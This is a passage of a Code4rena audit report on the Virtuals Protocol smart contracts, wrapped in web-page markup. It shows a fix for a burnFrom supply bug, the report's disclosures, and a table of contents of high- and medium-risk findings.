id=\"recommended-mitigation-steps-41\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-41\" aria-label=\"recommended mitigation steps 41 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eThere are two approaches to fix this issue:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eUpdate \u003ccode\u003e_maxTxAmount\u003c/code\u003e after burns:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"149\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Invalid address\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fix for the first bug\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_updateMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Recalculate _maxTxAmount based on new supply\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003eImplement proper upgrade tests that verify storage.\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003ch1 id=\"disclosures\" style=\"position:relative;\"\u003e\u003ca href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eDisclosures\u003c/h1\u003e\n\u003cp\u003eC4 is an open organization governed by participants in the community.\u003c/p\u003e\n\u003cp\u003eC4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\u003c/p\u003e\n\u003cp\u003eC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\u003c/p\u003e\n\u003cstyle class=\"grvsc-styles\"\u003e\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line \u003e * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting \u003e .grvsc-code \u003e .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n\u003c/style\u003e"])</script><script>self.__next_f.push([1,"16:T25e8,"])</script><script>self.__next_f.push([1,"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#overview\"\u003eOverview\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#about-c4\"\u003eAbout C4\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#summary\"\u003eSummary\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#scope\"\u003eScope\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#severity-criteria\"\u003eSeverity Criteria\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#high-risk-findings-6\"\u003eHigh Risk Findings (6)\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#h-01-lack-of-access-control-in-agentnftv2addvalidator-enables-unauthorized-validator-injection-and-causes-reward-accounting-inconsistencies\"\u003e[H-01] Lack of access control in \u003ccode\u003eAgentNftV2::addValidator()\u003c/code\u003e enables unauthorized validator injection and causes reward accounting inconsistencies\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#h-02-anybody-can-control-a-users-delegate-by-calling-agentvetokenstake-with-1-wei\"\u003e[H-02] Anybody can control a user’s delegate by calling \u003ccode\u003eAgentVeToken.stake()\u003c/code\u003e with 1 wei\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#h-03-public-servicenftupdateimpact-call-leads-to-cascading-issue\"\u003e[H-03] Public \u003ccode\u003eServiceNft::updateImpact\u003c/code\u003e call leads to cascading issue\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#h-04-public-contributionnftmint-leads-to-cascading-issues--loss-of-funds\"\u003e[H-04] Public \u003ccode\u003eContributionNft::mint\u003c/code\u003e leads to cascading issues / loss of funds\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#h-05-validatorregistryvalidatorscoregetpastvalidatorscore-allows-validator-to-earn-full-rewards-without-actually-engaging-with-the-protocol\"\u003e[H-05] \u003ccode\u003eValidatorRegistry::validatorScore/getPastValidatorScore\u003c/code\u003e allows validator to earn full rewards without actually engaging with the protocol\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#h-06-missing-prevagentidupdate-in-promptmulti-function-may-cause-token-loss-by-transferring-to-address0\"\u003e[H-06] Missing \u003ccode\u003eprevAgentId\u003c/code\u003eupdate in \u003ccode\u003epromptMulti()\u003c/code\u003e function may cause token loss by transferring to \u003ccode\u003eaddress(0)\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#medium-risk-findings-26\"\u003eMedium Risk Findings (26)\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#m-01-attacker-can-prevent-user-from-executing-application-registered-through-initfromtoken-in-agentfactoryv4\"\u003e[M-01] Attacker can prevent user from executing application registered through \u003ccode\u003einitFromToken()\u003c/code\u003e in \u003ccode\u003eAgentFactoryV4\u003c/code\u003e.\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-02-missing-slippage-protection-on-buy-and-sell\"\u003e[M-02] Missing slippage protection on buy and sell\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-03-slippage-protection-in-agenttaxdcasell-and-bondingtaxswapforasset-is-calculated-at-execution-time-effectively-retrieving-the-very-same-price-that-the-trade-will-be-executing-at-ultimately-providing-no-protection\"\u003e[M-03] Slippage protection in \u003ccode\u003eAgentTax::dcaSell\u003c/code\u003e and \u003ccode\u003eBondingTax::swapForAsset\u003c/code\u003e is calculated at execution time, effectively retrieving the very same price that the trade will be executing at, ultimately providing no protection\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-04-launched-tokens-are-vulnerable-to-flashloan-attacks-forcing-premature-graduation-allowing-reward-manipulation\"\u003e[M-04] Launched tokens are vulnerable to flashloan attacks forcing premature graduation, allowing reward manipulation\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-05-division-in-bondingsol_opentradingonuniswap-results-in-an-incorrect-lpsupply-higher-vaultsupply-and-dust-agenttokens-getting-locked-in-fpair\"\u003e[M-05] Division in \u003ccode\u003eBonding.sol._openTradingOnUniswap()\u003c/code\u003e results in an incorrect \u003ccode\u003elpSupply\u003c/code\u003e, higher \u003ccode\u003evaultSupply\u003c/code\u003e, and dust \u003ccode\u003eAgentTokens\u003c/code\u003e getting locked in \u003ccode\u003eFPair\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-06-bondingtax-has-invalid-slippage-implementation\"\u003e[M-06] \u003ccode\u003eBondingTax\u003c/code\u003e has invalid slippage implementation\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-07-amountoutmin-passed-in-as-0-in-agenttoken_swaptax-leads-to-loss-of-funds-due-to-slippage\"\u003e[M-07] \u003ccode\u003eamountOutMin\u003c/code\u003e passed in as 0 in \u003ccode\u003eAgentToken::_swapTax\u003c/code\u003e leads to loss of funds due to slippage\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-08-score-in-agentdao-is-not-an-accurate-measure-and-can-be-artificially-inflated-by-spamming-proposals\"\u003e[M-08] Score in \u003ccode\u003eAgentDAO\u003c/code\u003e is not an accurate measure and can be artificially inflated by spamming proposals\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-09-functions-in-ferc20-cant-be-invoked\"\u003e[M-09] Functions in FERC20 can’t be invoked\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-10-missing-totalsupply-reduction-in-burnfrom-allows-supply-manipulation-erc20-violation\"\u003e[M-10] Missing \u003ccode\u003etotalSupply\u003c/code\u003e reduction in \u003ccode\u003eburnFrom\u003c/code\u003e allows supply manipulation (ERC20 Violation)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-11-agentdao_castvote-doesnt-check-the-array-of-votes-emitted-which-determine-the-number-of-battles-fought-in-elocalculatorsol-allowing-the-user-to-increase-the-elo-of-a-contribution-unfairly-inflating-the-maturityimpact-of-servicenfts\"\u003e[M-11] \u003ccode\u003eAgentDAO::_castVote\u003c/code\u003e doesn’t check the array of votes emitted, which determine the number of battles fought in \u003ccode\u003eEloCalculator.sol\u003c/code\u003e, allowing the user to increase the ELO of a contribution unfairly, inflating the maturity/impact of \u003ccode\u003eServiceNFTs\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-12-no-slippage-protection-during-adding-liquidity-to-uniswap\"\u003e[M-12] No slippage protection during adding liquidity to uniswap\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-13-removal-of-a-liquidity-pool-on-agenttokenremoveliquiditypool-still-incurs-taxes-on-swaps\"\u003e[M-13] Removal of a liquidity pool on \u003ccode\u003eAgentToken::removeLiquidityPool\u003c/code\u003e still incurs taxes on swaps\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-14-votesupgradeabledelegate-bypasses-the-addvalidator-call-leads-to-a-non-validator-holding-voting-power-along-with-loss-of-rewards\"\u003e[M-14] \u003ccode\u003eVotesUpgradeable::delegate\u003c/code\u003e bypasses the \u003ccode\u003eaddValidator\u003c/code\u003e call, leads to a non-validator holding voting power along with loss of rewards\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-15-if-ffactorybuytax-and--or-ffactoryselltax-is-set-to-0-buy--sell-would-revert\"\u003e[M-15] If \u003ccode\u003eFFactory::buyTax\u003c/code\u003e and / or \u003ccode\u003eFFactory::sellTax\u003c/code\u003e is set to 0, buy / sell would revert\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-16-elo-calculation-error\"\u003e[M-16] \u003ccode\u003eElo\u003c/code\u003e calculation error\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-17-virtualgenesisdaosolearlyexecute-proposals-can-be-executed-two-times\"\u003e[M-17] \u003ccode\u003eVirtualGenesisDAO.sol:earlyExecute()\u003c/code\u003e proposals can be executed two times\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-18-genesissolongenesissuccess-users-may-lose-their-unclaimed-agenttokens-if-a-second-launch-occurs-before-theyve-claimed-their-rewards-from-the-first\"\u003e[M-18] \u003ccode\u003eGenesis.sol:onGenesisSuccess()\u003c/code\u003e users may lose their unclaimed \u003ccode\u003eagentTokens\u003c/code\u003e if a second launch occurs before they’ve claimed their rewards from the first\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-19-lack-of-maturity-check-for-non-founder-users-allowing-immediate-withdrawals\"\u003e[M-19] Lack of maturity check for non-founder users allowing immediate withdrawals\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-20-delegation-not-revoked-on-withdrawal-allows-reward-and-voting-power-inflation-post-maturity\"\u003e[M-20] Delegation not revoked on withdrawal allows reward and voting power inflation post-maturity\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-21-battleelo-is-at-risk-of-underflow-revert-which-may-dos-voting\"\u003e[M-21] \u003ccode\u003ebattleElo\u003c/code\u003e is at risk of underflow revert, which may DOS voting\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-22-founder-has-to-double-stake-during-migration-with-the-initial-lp-locked-in-the-old-vetoken\"\u003e[M-22] Founder has to double-stake during migration with the initial LP locked in the old \u003ccode\u003eveToken\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-23-using-agentfactorysetassettoken-will-lead-to-loss-of-funds\"\u003e[M-23] Using \u003ccode\u003eAgentFactory::setAssetToken\u003c/code\u003e will lead to loss of funds\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-24-precision-loss-in-pricealast-and-priceblast\"\u003e[M-24] Precision loss in \u003ccode\u003epriceALast\u003c/code\u003e and \u003ccode\u003epriceBLast\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-25-incorrect-mathematical-logic\"\u003e[M-25] Incorrect mathematical logic\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-26-imprecise-calculations-in-launchfor-lead-to-less-liquidity-be-added-to-the-pair-via-the-router\"\u003e[M-26] Imprecise calculations in \u003ccode\u003elaunchFor()\u003c/code\u003e lead to less liquidity be added to the pair via the router\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#low-risk-and-non-critical-issues\"\u003eLow Risk and Non-Critical Issues\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#01-missing-update-of-prevagentid-in-promptmulti\"\u003e01 Missing update of \u003ccode\u003eprevAgentId\u003c/code\u003e in \u003ccode\u003epromptMulti\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#02-duplicate-import-statement-for-mathsol\"\u003e02 Duplicate import statement for \u003ccode\u003eMath.sol\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#03-invalid-agentid-leads-to-token-burning\"\u003e03 Invalid \u003ccode\u003eagentId\u003c/code\u003e leads to token burning\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#04-risky-one-step-admin-transfer-in-contributionnftsol\"\u003e04 Risky one-step admin transfer in \u003ccode\u003eContributionNft.sol\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#05-fee-induced-reserve-inconsistency-in-frouter\"\u003e05 Fee-induced reserve inconsistency in \u003ccode\u003eFRouter\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#06-duplicate-import-statement-for-agentfactoryv3sol-in-fgenesissol\"\u003e06 Duplicate import statement for \u003ccode\u003eAgentFactoryV3.sol\u003c/code\u003e in \u003ccode\u003eFGenesis.sol\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#07-misconception-in-using-blocktimestamp--x-for-swap-deadlines\"\u003e07 Misconception in using \u003ccode\u003eblock.timestamp + X\u003c/code\u003e for swap deadlines\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#08-widespread-use-of-infinite-token-approvals\"\u003e08 Widespread use of infinite token approvals\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#09-missing-virtual-functions-for-inheritance\"\u003e09 Missing \u003ccode\u003evirtual\u003c/code\u003e functions for inheritance\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#10-totalsupply-not-updated-on-burning-in-ferc20\"\u003e10 \u003ccode\u003etotalSupply\u003c/code\u003e not updated on burning in \u003ccode\u003eFERC20\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#11-wrong-max-transaction-limit-after-burns\"\u003e11 Wrong max transaction limit after burns\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#disclosures\"\u003eDisclosures\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e"])</script><script>self.__next_f.push([1,"19:Td6a14,"])</script><script>self.__next_f.push([1,"\u003ch1 id=\"overview\" style=\"position:relative;\"\u003e\u003ca href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eOverview\u003c/h1\u003e\n\u003ch2 id=\"about-c4\" style=\"position:relative;\"\u003e\u003ca href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eAbout C4\u003c/h2\u003e\n\u003cp\u003eCode4rena (C4) is a competitive audit platform where security researchers, referred to as Wardens, review, audit, and analyze codebases for security vulnerabilities in exchange for bounties provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eA C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eDuring the audit outlined in this document, C4 conducted an analysis of the Virtuals Protocol smart contract system. The audit took place from April 17 to May 07, 2025.\u003c/p\u003e\n\u003cp\u003eFinal report assembled by Code4rena.\u003c/p\u003e\n\u003ch1 id=\"summary\" style=\"position:relative;\"\u003e\u003ca href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSummary\u003c/h1\u003e\n\u003cp\u003eThe C4 analysis yielded an aggregated total of 32 unique vulnerabilities. Of these vulnerabilities, 6 received a risk rating in the category of HIGH severity and 26 received a risk rating in the category of MEDIUM severity.\u003c/p\u003e\n\u003cp\u003eAdditionally, C4 analysis included 38 reports detailing issues with a risk rating of LOW severity or non-critical. \u003c/p\u003e\n\u003cp\u003eAll of the issues presented here are linked back to their original finding, which may include relevant context from the judge and Virtuals Protocol team.\u003c/p\u003e\n\u003ch1 id=\"scope\" style=\"position:relative;\"\u003e\u003ca href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 